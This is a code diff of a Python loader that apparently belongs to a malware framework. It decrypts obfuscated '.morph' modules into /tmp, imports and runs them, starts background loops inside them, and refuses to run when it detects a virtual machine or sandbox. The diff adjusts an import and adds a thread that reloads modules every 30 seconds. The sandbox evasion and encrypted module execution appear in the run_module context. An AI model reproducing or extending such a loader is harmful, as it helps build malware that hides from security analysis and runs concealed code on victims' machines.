@@ -17,7 +17,7 @@ import psutil
 import platform
 from pathlib import Path
 from types import ModuleType
-from obfuscation import decrypt_module
+from modules import obfuscation
 import logging
 
 logger = logging.getLogger("loader")
@@ -53,13 +53,13 @@ def _is_vm_or_sandbox() -> bool:
 def run_module(mod_name: str, args: dict = None, timeout: int = TIMEOUT) -> dict:
     """
     Decrypts <mod_name>.morph to /tmp/<mod_name>.py, imports and runs its run(args).
-    Enforces timeout using threading. Returns module’s return data or timeout error.
+    Enforces timeout using threading. Returns module's return data or timeout error.
     """
     if _is_vm_or_sandbox():
         logger.error(f"[LOADER] Sandbox detected; refusing to load {mod_name}")
         return {"status": "error", "detail": "Sandbox/VM environment detected"}
 
-    tmp_py_path = decrypt_module(mod_name)
+    tmp_py_path = obfuscation.decrypt_module(mod_name)
     if not tmp_py_path:
         return {"status": "error", "detail": "Decryption failed"}
 
@@ -107,3 +107,31 @@ def load_all_modules():
         mod_name = morph.stem
         # Run with empty args to initialize any background loops inside modules
         run_module(mod_name, {}, timeout=30)
+
+def start_watcher():
+    """Start the module watcher for hot reloading"""
+    import threading
+    import time
+    
+    def watcher_loop():
+        while True:
+            try:
+                # Check for module changes
+                for module_file in Path(__file__).parent.glob("*.py"):
+                    if module_file.name in ["__init__.py", "loader.py"]:
+                        continue
+                    
+                    # Check if module needs reloading
+                    module_name = module_file.stem
+                    if module_name in sys.modules:
+                        # Force reload
+                        importlib.reload(sys.modules[module_name])
+                        log_event("loader", f"Reloaded module: {module_name}".encode())
+                
+                time.sleep(30)  # Check every 30 seconds
+            except Exception as e:
+                log_event("loader", f"Watcher error: {e}".encode())
+                time.sleep(60)
+    
+    threading.Thread(target=watcher_loop, daemon=True).start()
+    log_event("loader", "Module watcher started".encode())
